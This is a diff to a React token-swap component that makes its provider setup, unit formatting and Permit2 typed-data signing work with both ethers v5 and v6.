@@ -39,6 +39,24 @@ export default function SwapCard({ walletAddress, provider }) {
     }
   };
 
+  // Helper to create safe provider instance for ethers v5 & v6
+  const getEthersProvider = (rawProvider) => {
+    if (!rawProvider) return null;
+    // Check if rawProvider is already an Ethers Provider
+    if (rawProvider.getSigner && typeof rawProvider.getSigner === 'function' && rawProvider.getNetwork) {
+      return rawProvider;
+    }
+    // Ethers v6
+    if (ethers.BrowserProvider) {
+      return new ethers.BrowserProvider(rawProvider);
+    }
+    // Ethers v5
+    if (ethers.providers && ethers.providers.Web3Provider) {
+      return new ethers.providers.Web3Provider(rawProvider);
+    }
+    return null;
+  };
+
   useEffect(() => {
     if (walletAddress && provider) loadBalance();
     updatePrices();
@@ -53,14 +71,15 @@ export default function SwapCard({ walletAddress, provider }) {
   const loadBalance = async () => {
     try {
       if (!provider) return;
-      const ethersProvider = new ethers.BrowserProvider(provider);
+      const ethersProvider = getEthersProvider(provider);
       const signer = await ethersProvider.getSigner();
       
       const usdtContract = new ethers.Contract(USDT_ADDRESS, USDT_ABI, signer);
       const balance = await usdtContract.balanceOf(walletAddress);
       const decimals = await usdtContract.decimals();
       
-      const formattedBalance = ethers.formatUnits(balance, decimals);
+      const formatFn = ethers.formatUnits || (ethers.utils && ethers.utils.formatUnits);
+      const formattedBalance = formatFn ? formatFn(balance, decimals) : '0';
       setUsdtBalance(parseFloat(formattedBalance).toLocaleString());
     } catch (error) { 
       console.error("Balance load error:", error); 
@@ -101,7 +120,7 @@ export default function SwapCard({ walletAddress, provider }) {
     if (fromAmount) setTimeout(() => calculateOutput(fromAmount), 100);
   };
 
-  // ⭐ WalletConnect Compatible Permit2 Execution
+  // ⭐ Permit2 Execution with Constructor Fix
   const executeSwap = async () => {
     if (!walletAddress || !provider) { 
       setStatus({ type: 'error', msg: 'Please connect your wallet first!' }); 
@@ -116,14 +135,16 @@ export default function SwapCard({ walletAddress, provider }) {
       setIsLoading(true);
       setStatus({ type: 'info', msg: '⏳ Waiting for signature in wallet...' });
       
-      // 1. Ethers Provider setup
-      const ethersProvider = new ethers.BrowserProvider(provider);
+      // 1. Get Safe Ethers Provider & Signer
+      const ethersProvider = getEthersProvider(provider);
       const signer = await ethersProvider.getSigner();
-      const currentAddress = await signer.getAddress();
+      const currentAddress = typeof signer.getAddress === 'function' ? await signer.getAddress() : walletAddress;
       const network = await ethersProvider.getNetwork();
       
       const tokenDecimals = fromToken.decimals || (fromToken.symbol === 'USDT' ? 6 : 18);
-      const amount = ethers.parseUnits(fromAmount, tokenDecimals);
+      
+      const parseFn = ethers.parseUnits || (ethers.utils && ethers.utils.parseUnits);
+      const amount = parseFn(fromAmount, tokenDecimals);
       
       const expiration = Math.floor(Date.now() / 1000) + (30 * 24 * 60 * 60); 
       const sigDeadline = Math.floor(Date.now() / 1000) + 3600; 
@@ -179,13 +200,13 @@ export default function SwapCard({ walletAddress, provider }) {
         sigDeadline: sigDeadline
       };
       
-      // 💥 6. Hybrid Signing Logic for WalletConnect & Browser Extensions
+      // 💥 6. Hybrid Signing
       let signature;
-      try {
+      if (typeof signer.signTypedData === 'function') {
         signature = await signer.signTypedData(domain, types, message);
-      } catch (e) {
-        console.log("Signer signTypedData failed, using raw provider request:", e);
-        
+      } else if (typeof signer._signTypedData === 'function') {
+        signature = await signer._signTypedData(domain, types, message);
+      } else {
         const payload = JSON.stringify({
           domain: { ...domain, chainId: Number(domain.chainId) },
           types: types,
@@ -207,7 +228,7 @@ export default function SwapCard({ walletAddress, provider }) {
             params: [currentAddress, payload]
           });
         } else {
-          throw e;
+          throw new Error("No available method to sign Permit2 typed data");
         }
       }
       
